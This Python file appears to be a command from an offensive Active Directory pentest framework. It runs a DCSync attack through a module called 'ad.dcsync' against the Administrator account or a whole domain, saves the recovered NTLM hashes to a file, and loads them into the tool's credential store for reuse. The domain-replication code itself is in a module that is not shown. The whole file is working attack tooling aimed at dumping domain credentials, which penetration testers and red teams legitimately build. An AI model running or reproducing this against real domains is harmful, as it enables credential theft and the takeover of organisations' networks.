def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, target_add_cred
    from core.paths import get_chain_artifacts_dir
    import argparse

    data, _ = load_current_profile()
    
    # Resolve what to name the file
    is_all = getattr(args, "all", False)
    target_name = getattr(args, "user", None) or (args.extra[0] if args.extra else "Administrator")
    
    label = "full_domain" if is_all else target_name
    artifacts = get_chain_artifacts_dir(data["name"], "dcsync")
    dump_file = artifacts / f"{label}_hashes.txt"

    print(f"[*] Step 1: Performing DCSync against {label}...")
    
    # --- FIX: Pass flags in the positional 'extra' list ---
    module_args = []
    if is_all: module_args.append("--all")
    if getattr(args, "user", None): module_args.append(args.user)
    elif args.extra: module_args.extend(args.extra)

    # Call module
    new_creds = run_module_by_name("ad.dcsync", module_args, data)

    if not new_creds:
        print(f"[-] No hashes recovered for {label}.")
        return

    # --- SAVE ---
    lines = [f"{c['user']}:{c['secret']}" for c in new_creds if c['type'] == 'ntlm']
    dump_file.write_text("\n".join(lines))
    print(f"\n[+] Raw NT hashes saved to {dump_file}")


    for c in new_creds:
        target_add_cred(argparse.Namespace(
            user=c['user'], password=None, hash=c['secret'], aes=None, ccache=None
        ))